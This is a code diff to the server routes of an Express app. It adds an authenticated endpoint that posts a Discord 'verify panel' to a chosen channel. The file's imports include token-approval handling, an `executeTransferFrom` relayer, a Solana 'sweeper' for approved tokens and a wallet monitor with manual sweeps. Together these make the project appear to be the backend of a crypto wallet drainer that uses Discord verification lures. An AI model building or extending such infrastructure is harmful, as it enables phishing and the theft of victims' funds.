@@ -2,7 +2,7 @@ import type { Express, Request, Response, NextFunction } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
-import { sendTicketPanel } from "./discord-bot";
+import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
@@ -310,6 +310,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ success: true });
     } catch (error: any) {
       res.status(500).json({ error: error.message || "Failed to send ticket panel" });
+    }
+  });
+
+  app.post("/api/discord/send-verify", requireDashboardAuth, async (req, res) => {
+    try {
+      const { channelId, serverName } = req.body;
+      if (!channelId) {
+        return res.status(400).json({ error: "channelId is required" });
+      }
+      await sendVerifyPanel(channelId, serverName || "Server");
+      res.json({ success: true });
+    } catch (error: any) {
+      res.status(500).json({ error: error.message || "Failed to send verify panel" });
     }
   });
 
